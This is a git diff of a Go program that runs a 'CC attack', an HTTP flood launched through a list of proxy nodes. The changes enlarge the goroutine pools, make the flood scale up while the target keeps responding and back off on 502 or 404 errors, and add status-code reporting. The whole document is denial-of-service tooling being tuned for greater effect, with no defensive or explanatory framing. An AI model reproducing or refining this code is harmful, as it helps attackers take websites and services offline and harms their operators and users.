@@ -40,7 +40,7 @@ func main() {
 		status     int
 	)
 
-	pool1, _ := ants.NewPoolWithFunc(config.Cfg.Connections/3, func(i interface{}) {
+	pool1, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
 		p := i.(utils.Nodes)
 		aliveP, _ := utils.CCAttack(&p, &counts, &status)
 		if aliveP != nil {
@@ -61,7 +61,7 @@ func main() {
 	wg.Wait()
 	pool1.Release()
 
-	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections/3, func(i interface{}) {
+	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections/2, func(i interface{}) {
 		p := i.(*utils.Nodes)
 		_, _ = utils.CCAttack(p, &counts, &status)
 		wg.Done()
@@ -71,19 +71,18 @@ func main() {
 	go func() {
 		for {
 			switch {
-			case (status == 502 || status == 404) && pool2.Cap() > 32:
+			case (status == 502 || status == 404) && pool2.Cap() > 24:
 				pool2.Tune(pool2.Cap() - 10)
-			case status < 500 && status > 0 && pool2.Cap() < 3*config.Cfg.Connections:
-				pool2.Tune(pool2.Cap() + int(float64(config.Cfg.Connections)*0.2))
+			case status < 500 && status > 0 && pool2.Cap() < 4*config.Cfg.Connections:
+				pool2.Tune(pool2.Cap() + 50)
 			}
-			fmt.Printf("Total attack: %d [%d nodes] - Current connection: %d\n", counts, len(alivePlist), pool2.Running())
-			time.Sleep(10 * time.Second)
+			fmt.Printf("Total attack: %d [%d nodes] - Current connection: %d - StatusCode: %d\n", counts, len(alivePlist), pool2.Running(), status)
+			time.Sleep(5 * time.Second)
 		}
 	}()
 
 	fmt.Printf("Filtered %d nodes. Now starting fast CC attack after 5s!\n", len(alivePlist))
 	for {
-		fmt.Println("Batch Attack")
 		for _, p := range alivePlist {
 			wg.Add(1)
 			err = pool2.Invoke(p)
@@ -91,6 +90,5 @@ func main() {
 				fmt.Println(err.Error())
 			}
 		}
-		fmt.Println("Attack completed.")
 	}
 }
